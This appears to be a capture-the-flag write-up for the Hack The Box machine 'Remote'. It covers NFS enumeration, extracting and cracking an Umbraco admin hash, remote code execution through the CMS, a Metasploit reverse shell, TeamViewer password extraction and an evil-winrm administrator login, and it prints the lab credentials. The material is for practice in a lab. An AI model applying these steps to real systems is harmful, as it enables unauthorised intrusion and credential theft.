# [Remote](https://app.hackthebox.com/machines/remote)

```bash
nmap -p- --min-rate 10000  10.10.10.180 -Pn
```

![Alt text](img/image.png)


Let's do nmap scan for this open ports via great scope.

```bash
nmap -A -sC -sV -p21,80,111,135,139,445,2049 10.10.10.180 -Pn
```


I just enumerate all ports, but for (2049) , I just use `showmount` command to look at services.

```bash
showmount -e 10.10.10.180
```

![Alt text](img/image-1.png)


Let's export '/site_backups' to our local machine.

```bash
mount -t nfs 10.10.10.180:/site_backups /mnt/
```

Here I find 'Umbraco.sdf' file on 'App_Data' folder.

![Alt text](img/image-2.png)


I just take credentials from here.

admin@htb.local: b8be16afba8c314ad33d812f22a04991b90e2aaa 


Let's crack this hash via `hashcat` tool.

```bash
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```

![Alt text](img/image-3.png)


Now, I have valid credentials as below.

admin@htb.local: baconandcheese


Let's login to CMS application which serves on port 80.

![Alt text](img/image-4.png)


I see that it is 'Friendly' CMS application.

![Alt text](img/image-5.png)


I see the version of 'Umbraco' CMS which is 7.12.4

![Alt text](img/image-6.png)

I find below RCE exploits.

![Alt text](img/image-7.png)


Let's use one of them.

![Alt text](img/image-8.png)


We can execute commands, let's do reverse shell cmdlet via `msfconsole`.

We use module called 'exploit/multi/script/web_delivery'.


![Alt text](img/image-9.png)


And enter this into command section as below.

![Alt text](img/image-10.png)


Now, we have valid session whose id is '1'.

![Alt text](img/image-11.png)


But, we don't have access to 'user.txt' file. That's why we need to escalate our privileges.


I see 'TeamViewer' which can be contain credentials.

![Alt text](img/image-12.png)


I use `msfconsole` module to extract passwords from 'TeamViewer' software.

Module name=> `post/windows/gather/credentials/teamviewer_passwords`


Hola I find password.

![Alt text](img/image-13.png)


Let's login via admin credentials.

administrator: !R3m0te!


I use `evil-winrm` to login into target machine.

```bash
evil-winrm -u administrator -p '!R3m0te!' -i 10.10.10.180
```

![Alt text](img/image-14.png)


user.txt and root.txt

![Alt text](img/image-15.png)

![Alt text](img/image-16.png)